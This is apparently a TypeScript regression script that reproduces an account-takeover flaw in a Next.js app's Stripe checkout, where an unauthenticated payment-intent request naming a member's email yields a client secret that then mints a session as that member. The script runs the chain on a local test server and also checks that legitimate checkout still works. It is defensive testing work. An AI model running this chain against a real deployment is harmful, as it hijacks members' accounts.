import dotenv from "dotenv";
import path from "node:path";
dotenv.config({ path: path.resolve(process.cwd(), ".env.local") });

/**
 * Reenacts the account-takeover chain found on 2026-08-28, end to end over HTTP.
 *
 * THE CLAIM
 *   `POST /api/stripe/create-payment-intent` requires no session and takes `userEmail`
 *   from the request body. If that email belongs to a registered member it binds the
 *   PaymentIntent to THEIR `stripeCustomerId` and returns the `client_secret`.
 *   `POST /api/auth/session-from-payment` then derives identity from
 *   `paymentIntent.customer` alone, so possession of that client secret mints a session
 *   as the member. Attacker cost: one minimum charge on their OWN card.
 *
 * NOTHING IS MOCKED. Both endpoints are hit over HTTP on a real dev server, and Stripe
 * really creates and confirms the PaymentIntent.
 *
 * SETUP — the server must run against an ISOLATED database, never the Atlas cluster in
 * `.env.local`, and Stripe must be in test mode:
 *
 *   docker run -d --name ta-repro-mongo -p 27018:27017 mongo:7
 *   MONGODB_URI=mongodb://127.0.0.1:27018/ta_repro npx tsx scripts/seed-takeover-repro.ts <cus_test_id>
 *   MONGODB_URI=mongodb://127.0.0.1:27018/ta_repro NEXTAUTH_URL=http://localhost:3100 \
 *     npx next dev --turbopack -p 3100
 *   REPRO_BASE=http://localhost:3100 npx tsx scripts/smoke-session-from-payment-takeover.ts
 *
 * Expect while vulnerable: "TAKEOVER SUCCEEDED", exit 1.
 * Expect once fixed:       the chain breaks at step 1 or 3, exit 0.
 */

const BASE = process.env.REPRO_BASE || "http://localhost:3100";
const VICTIM_EMAIL = "victim@example.test";

async function attemptTakeover(): Promise<boolean> {
  const sk = process.env.STRIPE_SECRET_KEY || "";
  if (!sk.startsWith("sk_test")) {
    console.error("REFUSING TO RUN: STRIPE_SECRET_KEY is not a test-mode key.");
    process.exit(2);
  }

  const { stripe } = await import("@/lib/stripe");
  const { verifyJWT } = await import("@/lib/jwt");

  const post = async (route: string, body: unknown) => {
    const res = await fetch(BASE + route, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body),
    });
    return { status: res.status, body: (await res.json().catch(() => ({}))) as Record<string, unknown> };
  };

  console.log(`target           : ${BASE}`);
  console.log(`attacker knows   : "${VICTIM_EMAIL}". No password, no token, no session.\n`);

  // ── STEP 1 — unauthenticated request naming the victim by email. ──────────────
  const r1 = await post("/api/stripe/create-payment-intent", {
    amount: 100, // A$1.00
    currency: "aud",
    userEmail: VICTIM_EMAIL,
    packageId: "apprentice",
    packageName: "Apprentice Pack",
  });
  console.log(`STEP 1  POST /api/stripe/create-payment-intent   (no cookies, no session)`);
  console.log(`        -> HTTP ${r1.status}   client_secret returned: ${Boolean(r1.body.client_secret)}`);
  if (!r1.body.client_secret) {
    console.log(`        -> BLOCKED: ${JSON.stringify(r1.body)}`);
    console.log("\n✅ Chain broken at step 1 — the endpoint would not bind the victim's customer.");
    return false;
  }

  const pi = await stripe.paymentIntents.retrieve(String(r1.body.payment_intent_id));
  const boundTo = typeof pi.customer === "string" ? pi.customer : pi.customer?.id;
  console.log(`        -> intent ${pi.id}`);
  console.log(`        -> bound to Stripe customer : ${boundTo ?? "(none)"}`);
  console.log(`        -> metadata.userId          : ${pi.metadata?.userId}`);
  console.log(`        -> metadata.userEmail       : ${pi.metadata?.userEmail}\n`);

  if (!boundTo) {
    console.log("✅ No customer bound — the identity link the takeover needs does not exist.");
    return false;
  }

  // ── STEP 2 — the attacker pays A$1 on their OWN card. ─────────────────────────
  const confirmed = await stripe.paymentIntents.confirm(pi.id, {
    payment_method: "pm_card_visa", // Stripe test card standing in for the ATTACKER's card
    return_url: `${BASE}/checkout/success`,
  });
  console.log(`STEP 2  attacker confirms the intent with their own card`);
  console.log(`        -> status: ${confirmed.status}   amount: ${confirmed.amount} ${confirmed.currency}\n`);

  // ── STEP 3 — trade the client secret for a session. ───────────────────────────
  const r3 = await post("/api/auth/session-from-payment", {
    paymentIntentClientSecret: confirmed.client_secret,
  });
  console.log(`STEP 3  POST /api/auth/session-from-payment`);
  console.log(`        -> HTTP ${r3.status}   token issued: ${Boolean(r3.body.token)}`);
  if (!r3.body.token) {
    console.log(`        -> BLOCKED: ${JSON.stringify(r3.body)}`);
    console.log("\n✅ Chain broken at step 3 — no session was minted.");
    return false;
  }

  const payload = await verifyJWT(String(r3.body.token));
  const returned = r3.body.user as { email?: string } | undefined;
  console.log(`        -> token subject : ${payload.sub}`);
  console.log(`        -> token email   : ${payload.email}`);
  console.log(`        -> response user : ${returned?.email}`);

  console.log("\n────────────────────────────────────────────────────────────");
  if (payload.email === VICTIM_EMAIL) {
    console.log("❌ TAKEOVER SUCCEEDED");
    console.log(`   Knowing only "${VICTIM_EMAIL}", an unauthenticated caller paid A$1.00 on`);
    console.log(`   their own card and received a valid sign-in token for that member.`);
    console.log(`   signIn("auto-login", { token }) then completes the takeover.`);
    return true;
  }
  console.log(`✅ A token was issued but not for the victim (${payload.email}) — chain broken.`);
  return false;
}

/**
 * The other half of the proof: the LEGITIMATE flow must still work.
 *
 * MembershipModal step 1 registers, step 2 pays — with no session in between. That call
 * must still bind the account's Stripe customer, or the campaign-code attach breaks (the
 * EXTRA100 regression documented in docs/payment/gotchas.md). Blocking the attack while
 * breaking this would be a false win, so both are asserted in the same run.
 */
async function legitimateFlowStillBinds(): Promise<boolean> {
  const email = `newbuyer-${Date.now()}@example.test`;
  const mobile = `04${String(Date.now()).slice(-8)}`;

  const reg = await fetch(BASE + "/api/auth/register", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ firstName: "New", lastName: "Buyer", email, mobile }),
  });
  const regBody = (await reg.json().catch(() => ({}))) as { success?: boolean; error?: string };
  // The proof cookie the fix introduced. A plain fetch does not keep a jar, so it is
  // forwarded by hand — exactly what a browser would do automatically.
  const cookie = (reg.headers.getSetCookie?.() ?? []).map((c) => c.split(";")[0]).join("; ");
  console.log(`\nLEGIT   POST /api/auth/register  -> HTTP ${reg.status} success=${regBody.success}`);
  console.log(`        -> checkout identity cookie set: ${cookie.includes("ta_checkout_identity")}`);
  if (!reg.ok) {
    console.log(`        -> register failed: ${JSON.stringify(regBody)}`);
    return false;
  }

  const res = await fetch(BASE + "/api/stripe/create-payment-intent", {
    method: "POST",
    headers: { "content-type": "application/json", cookie },
    body: JSON.stringify({
      amount: 100, currency: "aud", userEmail: email,
      packageId: "apprentice", packageName: "Apprentice Pack",
    }),
  });
  const body = (await res.json().catch(() => ({}))) as Record<string, unknown>;
  console.log(`LEGIT   POST /api/stripe/create-payment-intent  (with the cookie, no session)`);
  console.log(`        -> HTTP ${res.status}   client_secret: ${Boolean(body.client_secret)}`);
  if (!body.payment_intent_id) {
    console.log(`        -> FAILED: ${JSON.stringify(body)}`);
    return false;
  }

  const { stripe } = await import("@/lib/stripe");
  const pi = await stripe.paymentIntents.retrieve(String(body.payment_intent_id));
  const bound = typeof pi.customer === "string" ? pi.customer : pi.customer?.id;
  console.log(`        -> bound to a Stripe customer : ${bound ?? "(none)"}`);
  console.log(`        -> metadata.userId            : ${pi.metadata?.userId}`);
  const ok = Boolean(bound) && pi.metadata?.userId !== "guest";
  console.log(ok
    ? `        -> ✅ the step-1 registrant still binds — EXTRA100 flow intact`
    : `        -> ❌ REGRESSION: the legitimate flow no longer binds its account`);
  return ok;
}

async function main() {
  const takeoverWorks = await attemptTakeover();
  const legitOk = await legitimateFlowStillBinds();

  console.log("\n---------------------------------------------------------");
  console.log(`takeover blocked          : ${takeoverWorks ? "NO" : "yes"}`);
  console.log(`legitimate flow still ok  : ${legitOk ? "yes" : "NO"}`);
  // Both must hold. Blocking the attack by breaking checkout is not a fix.
  process.exit(!takeoverWorks && legitOk ? 0 : 1);
}

main().catch((e) => {
  console.error("\nrepro error:", e instanceof Error ? e.message : e);
  process.exit(2);
});
